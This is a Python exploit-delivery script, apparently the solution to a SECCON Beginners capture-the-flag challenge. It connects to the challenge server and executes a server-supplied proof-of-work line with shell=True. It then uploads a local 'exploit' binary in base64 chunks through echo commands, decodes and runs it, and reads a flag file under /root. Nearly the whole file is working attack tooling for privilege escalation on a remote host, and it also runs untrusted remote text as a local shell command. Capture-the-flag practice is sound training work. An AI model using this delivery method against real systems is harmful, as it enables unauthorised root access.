from ptrlib import *
import gzip, base64, tqdm, subprocess

HOST = os.getenv("CTF4B_HOST", "timeofcontrol.challenges.beginners.seccon.jp")
PORT = int(os.getenv("CTF4B_PORT", 9004))

sock = Socket(HOST, PORT)

first_line = sock.recvline()
if first_line.strip() == b"proof of work:":
    logger.info("Solving proof of work...")
    proof = subprocess.run(sock.recvline().decode().strip(), encoding='utf-8', stdout=subprocess.PIPE, shell=True).stdout.strip()
    sock.sendlineafter("solution: ", proof)
    logger.info("Proof of work solved.")

def run(cmd):
    sock.sendlineafter("$ ", cmd)
    return sock.recvline()

with open("./exploit", "rb") as fp:
    payload = fp.read()

payload = bytes2str(base64.b64encode(gzip.compress(payload)))

logger.info("Sending payload...")
with tqdm.tqdm(total=len(payload)) as pbar:
    for i in range(0, len(payload), 512):
        chunk = payload[i:i + 512]
        run(f"echo {chunk} >> /tmp/exploit.gz.b64")
        pbar.update(len(chunk))

logger.info("Payload sent, executing exploit...")
run("base64 -d /tmp/exploit.gz.b64 | gzip -d > /tmp/exploit")
run("chmod +x /tmp/exploit")
run("/tmp/exploit")
sock.sendline("cat /root/flag-61f1419230eaa880bdf02a5601863b48.txt")
sock.sh(prompt="")
